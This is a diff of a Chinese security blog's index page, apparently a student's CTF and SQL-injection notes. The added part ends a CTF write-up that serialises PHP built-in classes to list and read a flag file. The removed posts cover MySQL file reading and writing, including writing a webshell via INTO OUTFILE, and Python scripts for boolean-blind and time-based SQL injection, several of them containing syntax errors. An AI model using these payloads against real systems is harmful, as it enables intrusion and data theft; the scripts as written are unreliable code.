+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">		public $class=&#x27;Filesystemlterator&#x27;; </span><br><span class="line">		public $para=&quot;var/www/html&quot;; </span><br><span class="line">		public $check;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b=new A();</span><br><span class="line"></span><br><span class="line">echo serialize($b);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>得到序列化的数值后，构造payload</p>
+<p>得到aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE文件名</p>
+<p>然后在构造exp读取里面的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">		public $class=&#x27;SplFileObject &#x27;; </span><br><span class="line">		public $para=&quot;var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;; </span><br><span class="line">		public $check;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b=new A();</span><br><span class="line"></span><br><span class="line">echo serialize($b);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后看页面源代码，看见flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-nuctf[just serialize]内置类和php引用" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -842,212 +1081,9 @@ echo strcmp($_GET['ret'],'wer');
 
 
   
-    <article id="post-sql导入导出文件" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/17/sql%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6/" class="article-date">
-  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/sql%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6/">
-        sql导入导出文件
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="导出文件的常用函数"><a href="#导出文件的常用函数" class="headerlink" title="导出文件的常用函数"></a>导出文件的常用函数</h1><h2 id="load-file-file-name"><a href="#load-file-file-name" class="headerlink" title="load_file(file_name)"></a>load_file(file_name)</h2><ol>
-<li>读取文件并返回文件内容作为一个字符串</li>
-<li>读取文件条件：<br>（1）必须有权读取且文件必须完全可读<br>（2）欲读取文件必须在服务器上<br>（3）必须指定文件完整路径<br>（4）欲读取文件必须小于max_allowed_packet(最大允许传输包）</li>
-<li>判断读取文件是否有权限<br> and (select count(<em>) from mysql.user&gt;/0</em>)<br>（1）若返回正确，则文件有权可读<br>（2）若返回错误，则需要管理员给数据库账户降权<br> 注意：如果NTFS设置得当，是没有权限读取文件的，当遇到administrators才能访问的文件，使用者就别想load_file出来</li>
-<li>load_file()里的文件路径可以是ascii码或十六进制，也可以是路径形式（路径里的/用\代替）</li>
-</ol>
-<h2 id="replace"><a href="#replace" class="headerlink" title="replace()"></a>replace()</h2><ol>
-<li>替换字符</li>
-<li>格式：replace(原字段，”原字段旧内容”,”原字段新内容”)</li>
-</ol>
-<h2 id="hex"><a href="#hex" class="headerlink" title="hex()"></a>hex()</h2><ol>
-<li>将文件导出来，将load_file()读取的二进制文件转换为十六进制</li>
-</ol>
-<h1 id="实际注入中的难点"><a href="#实际注入中的难点" class="headerlink" title="实际注入中的难点"></a>实际注入中的难点</h1><ol>
-<li>绝对物理路径</li>
-<li>构造有效地畸形语句（报错爆出绝对路径）</li>
-<li>在许多php程序中，只要提交一个疑问进去，如果dispaly_errors=on的话，就会爆出web程序绝对的路径</li>
-</ol>
-<h1 id="导入数据库的常用函数"><a href="#导入数据库的常用函数" class="headerlink" title="导入数据库的常用函数"></a>导入数据库的常用函数</h1><h2 id="load-data-infile"><a href="#load-data-infile" class="headerlink" title="load data infile()"></a>load data infile()</h2><ol>
-<li>在一个文本文件中读取行，并装入一个表中，文件名称必须是文字字符串</li>
-<li>如：load data infile’/tml/t0.txt’ignore into t0 character set gbk fields teminated by lines terminated by’\n’<br>character set gbk是字符集设置为gbk,fields teminated by 为每一项数据之间的分隔符，lines terminated by’\n’是行   的结尾符</li>
-<li>判断方式：错误代码是2的时候，文件不存在，错误代码为13的时候为没有权限，可以考虑/tmp等文件夹</li>
-</ol>
-<h1 id="导入到文件函数"><a href="#导入到文件函数" class="headerlink" title="导入到文件函数"></a>导入到文件函数</h1><h2 id="select…-into-outfile’file-name’"><a href="#select…-into-outfile’file-name’" class="headerlink" title="select….into outfile’file_name’"></a>select….into outfile’file_name’</h2><ol>
-<li>可以把选择的行写入一个文件中，文件在服务器主机中创建，但必须拥有file权限，才能用这一语法，但file_name不能是一   个已经存在的文件</li>
-<li>两种利用方式：<br>（1）直接将select内容导入到文件中<br> 如：select version() into outfile”c:\phpnow\htdocs\test.php”,version()可以换成一句话代码<br>（2）修改文件结尾<br> 如： select version() into outfile”c:\phpnow\htdocs\test.php”lines terminated by 0x16进制文件</li>
-<li>secure_file_pri参数会限制load_file(),select…into outfile””,load data infile等函数，有三种情况：<br>（1）secure_file-pri=null时表示限制mysql,不准导入导出文件（mysql中的默认值）<br>（2）secure_file_pri=目录时限制mysql导出导入文件只发生在这个目录下<br>（3）secure_file_pri=没有具体值时，不限制mysql导出导入文件</li>
-<li>如果secure_file_pri=null(默认值），则只要改成secure_file_pri=”/“,然后重启mysql就可以了</li>
-</ol>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-sql布尔盲注" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/17/sql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" class="article-date">
-  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/sql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">
-        sql布尔盲注
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url=&quot; &quot;</span><br><span class="line"></span><br><span class="line">normalHtmlLen=len(request.get(url=url+&quot;?id=1&quot;).text) #计算返回报文长度</span><br><span class="line"></span><br><span class="line">print(&quot;The len of HTML:&quot;+str(normalHtmlLen))</span><br><span class="line"></span><br><span class="line">dbNameLen=0</span><br><span class="line"></span><br><span class="line">while true:</span><br><span class="line">	dbNameLen_url=url+&quot;?id=1&#x27;+and+length(database())=&quot;+str(baNameLen)+&quot;--+&quot;</span><br><span class="line">	</span><br><span class="line">	print(dbNameLen_url)</span><br><span class="line"></span><br><span class="line">	if len(requests.get(dbNameLen_url).text)==normalHtmlLen</span><br><span class="line">		print(&quot;The len of dbName:&quot;+str(dbNameLen))</span><br><span class="line">		break</span><br><span class="line"></span><br><span class="line">	if dbNameLen==30</span><br><span class="line">		print(error)</span><br><span class="line">		break</span><br><span class="line"></span><br><span class="line">	dbNameLen+=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dbName=&quot; &quot;</span><br><span class="line"></span><br><span class="line">for i in range(1,9): #从1到8循环</span><br><span class="line">	for a string.acsii_lowercase: #从a到z循环</span><br><span class="line"></span><br><span class="line">	dbName_url=url+&quot;?id=1&#x27;+and+substr(database(),&quot;+str(i)+&quot;,1)=&#x27;&quot;+a+&quot;&#x27;--+&quot;</span><br><span class="line">	print(dbName_url)</span><br><span class="line">	if len(requests.get(dbName_url).text)==normalHtmlLen</span><br><span class="line">		dbName+=a</span><br><span class="line">		print(dbName)</span><br><span class="line">		break</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" rel="tag">脚本编写</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-sql延时注入" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/17/sql%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5/" class="article-date">
-  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/sql%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5/">
-        sql延时注入
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url=&quot; &quot;</span><br><span class="line"></span><br><span class="line">def timeOut(url): #定义一个timeOut的函数</span><br><span class="line"></span><br><span class="line">	try:</span><br><span class="line">                      </span><br><span class="line">                    res=request.get(url,timeout=3)</span><br><span class="line">		rest.text</span><br><span class="line">	  except Exception as e:</span><br><span class="line">		return &quot;timeout&quot;</span><br><span class="line"></span><br><span class="line">dbNameLen=0</span><br><span class="line">while true:</span><br><span class="line">	dbNameLen+=1</span><br><span class="line">	dbNameLen_url=url+&quot;?id=1&#x27;+and+if(length(database())=&quot;+str(dbNameLen)+&quot;,sleep(5),1)--+&quot;</span><br><span class="line"></span><br><span class="line">	if &quot;timeout&quot; in timeOut(dbNameLen_url):</span><br><span class="line">	print(&quot;The len of dbNmae:&quot;+str(dbNameLen))</span><br><span class="line">	break</span><br><span class="line"></span><br><span class="line">	if dbNameLen==30:</span><br><span class="line">	print(&quot;error&quot;)</span><br><span class="line">	break</span><br><span class="line">	</span><br><span class="line">dbName=&quot; &quot;</span><br><span class="line">for i in range(1,dbNameLen+1):</span><br><span class="line">	for char in string.acsii_lowercase:</span><br><span class="line">		dbName_url=url+&quot;?id=1&#x27;+and+if(substr(database(),&quot;+str(i)+&quot;,1)=&#x27;&quot;+char+&quot;&#x27;,sleep(5),1)--+&quot;  </span><br><span class="line">	if  &quot;timeout&quot; in timeOut(dbName_url):</span><br><span class="line">		dbName+=char</span><br><span class="line">		print(&quot;The dbName:&quot;+dbName)</span><br><span class="line">		break</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" rel="tag">脚本编写</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
     </nav>
   
 </div>
